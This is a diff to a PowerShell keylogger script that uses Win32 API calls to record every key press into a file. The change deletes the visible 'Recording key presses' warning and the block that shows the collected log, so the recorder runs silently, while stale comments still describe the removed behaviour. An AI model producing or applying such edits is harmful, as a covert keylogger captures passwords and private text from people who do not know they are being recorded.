@@ -19,9 +19,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 # create output file
 $null = New-Item -Path $Path -ItemType File -Force
-try
-{
-Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
 # create endless loop. When user presses CTRL+C, finally-block
 # executes and shows the collected key presses
 while ($true) {
@@ -51,12 +48,6 @@ if ($mychar.ToString() -eq "c")
 }
 }
 }
-}
-}
-finally
-{
-# open logger file in Notepad
-#notepad $Path
 }
 }
 # records all key presses until script is aborted by pressing CTRL+C
